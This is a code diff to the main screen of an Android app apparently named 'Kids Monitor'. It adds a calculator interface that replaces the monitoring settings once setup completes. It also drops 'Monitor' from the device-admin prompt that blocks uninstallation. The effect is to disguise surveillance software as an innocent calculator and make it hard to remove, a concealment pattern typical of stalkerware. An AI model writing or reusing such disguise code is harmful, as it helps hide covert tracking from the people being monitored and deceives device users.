@@ -58,6 +58,7 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
         init()
+        initCalculator()
         binding.btnAdmin.setOnClickListener {
             enableDeviceAdmin()
         }
@@ -122,7 +123,7 @@ class MainActivity : AppCompatActivity() {
         if (checkPermissions()) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allow Kids Monitor admin so it cannot be easily uninstalled by your child.")
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Allow kids admin so it cannot be easily uninstalled by your child.")
             }
             startActivity(intent)
         } else {
@@ -239,9 +240,183 @@ class MainActivity : AppCompatActivity() {
                 else -> R.color.green
             }
             binding.progressBar.progressTintList = ContextCompat.getColorStateList(this, color)
+            if (progress == 100) {
+                binding.monitorConfigLayout.visibility = View.GONE
+                binding.calculatorLayout.visibility = View.VISIBLE
+            } else {
+                binding.monitorConfigLayout.visibility = View.VISIBLE
+                binding.calculatorLayout.visibility = View.GONE
+            }
         } else {
             binding.tvStatus.text = "Status: Not running"
             binding.progressBar.visibility = View.INVISIBLE
+            binding.monitorConfigLayout.visibility = View.VISIBLE
+            binding.calculatorLayout.visibility = View.GONE
+        }
+    }
+
+    private var calcValue = ""
+    private var calcOperator = ""
+    private var calcOperand: Double? = null
+    private var clearOnNextDigit = false
+
+    private fun initCalculator() {
+        val numberButtons = listOf(
+            binding.btn0 to "0", binding.btn1 to "1", binding.btn2 to "2",
+            binding.btn3 to "3", binding.btn4 to "4", binding.btn5 to "5",
+            binding.btn6 to "6", binding.btn7 to "7", binding.btn8 to "8",
+            binding.btn9 to "9"
+        )
+        
+        for ((button, value) in numberButtons) {
+            button.setOnClickListener {
+                appendNumber(value)
+            }
+        }
+        
+        binding.btnC.setOnClickListener {
+            clearCalculator()
+        }
+
+        binding.btnDelete.setOnClickListener {
+            deleteLastDigit()
+        }
+
+        binding.btnPercent.setOnClickListener {
+            applyPercent()
+        }
+
+        binding.btnDot.setOnClickListener {
+            appendDot()
+        }
+
+        binding.btnToggleSign.setOnClickListener {
+            toggleSign()
+        }
+        
+        binding.btnPlus.setOnClickListener { selectOperator("+") }
+        binding.btnMinus.setOnClickListener { selectOperator("-") }
+        binding.btnMultiply.setOnClickListener { selectOperator("×") }
+        binding.btnDivide.setOnClickListener { selectOperator("÷") }
+        
+        binding.btnEquals.setOnClickListener {
+            calculateResult()
+        }
+    }
+
+    private fun appendNumber(digit: String) {
+        if (clearOnNextDigit) {
+            calcValue = ""
+            clearOnNextDigit = false
+        }
+        if (calcValue == "0" || calcValue == "") {
+            calcValue = digit
+        } else {
+            calcValue += digit
+        }
+        binding.tvCalcDisplay.text = calcValue
+    }
+
+    private fun deleteLastDigit() {
+        if (clearOnNextDigit) {
+            calcValue = "0"
+            clearOnNextDigit = false
+        } else if (calcValue.isNotEmpty() && calcValue != "0") {
+            calcValue = calcValue.dropLast(1)
+            if (calcValue.isEmpty() || calcValue == "-") {
+                calcValue = "0"
+            }
+        }
+        binding.tvCalcDisplay.text = calcValue
+    }
+
+    private fun applyPercent() {
+        val num = calcValue.toDoubleOrNull()
+        if (num != null) {
+            val result = num / 100.0
+            calcValue = formatResult(result)
+            binding.tvCalcDisplay.text = calcValue
+            clearOnNextDigit = true
+        }
+    }
+
+    private fun appendDot() {
+        if (clearOnNextDigit) {
+            calcValue = "0."
+            clearOnNextDigit = false
+        } else if (!calcValue.contains(".")) {
+            if (calcValue.isEmpty()) {
+                calcValue = "0."
+            } else {
+                calcValue += "."
+            }
+        }
+        binding.tvCalcDisplay.text = calcValue
+    }
+
+    private fun toggleSign() {
+        if (calcValue.isNotEmpty() && calcValue != "0") {
+            calcValue = if (calcValue.startsWith("-")) {
+                calcValue.substring(1)
+            } else {
+                "-$calcValue"
+            }
+            binding.tvCalcDisplay.text = calcValue
+        }
+    }
+
+    private fun clearCalculator() {
+        calcValue = "0"
+        calcOperator = ""
+        calcOperand = null
+        clearOnNextDigit = false
+        binding.tvCalcDisplay.text = calcValue
+        binding.tvCalcHistory.text = ""
+    }
+
+    private fun selectOperator(op: String) {
+        calcOperand = calcValue.toDoubleOrNull()
+        calcOperator = op
+        clearOnNextDigit = true
+        
+        val firstValFormatted = formatResult(calcOperand ?: 0.0)
+        binding.tvCalcHistory.text = "$firstValFormatted $op"
+    }
+
+    private fun calculateResult() {
+        val secondOperand = calcValue.toDoubleOrNull()
+        val firstOperand = calcOperand
+        if (firstOperand != null && secondOperand != null && calcOperator.isNotEmpty()) {
+            val result = when (calcOperator) {
+                "+" -> firstOperand + secondOperand
+                "-" -> firstOperand - secondOperand
+                "×" -> firstOperand * secondOperand
+                "÷" -> if (secondOperand != 0.0) firstOperand / secondOperand else Double.NaN
+                else -> 0.0
+            }
+            
+            val firstFormatted = formatResult(firstOperand)
+            val secondFormatted = formatResult(secondOperand)
+            binding.tvCalcHistory.text = "$firstFormatted $calcOperator $secondFormatted ="
+            
+            calcValue = if (result.isNaN()) {
+                "Error"
+            } else {
+                formatResult(result)
+            }
+            
+            binding.tvCalcDisplay.text = calcValue
+            calcOperand = null
+            calcOperator = ""
+            clearOnNextDigit = true
+        }
+    }
+
+    private fun formatResult(num: Double): String {
+        return if (num % 1 == 0.0) {
+            num.toInt().toString()
+        } else {
+            String.format(java.util.Locale.US, "%.6f", num).trimEnd('0').trimEnd('.')
         }
     }
 
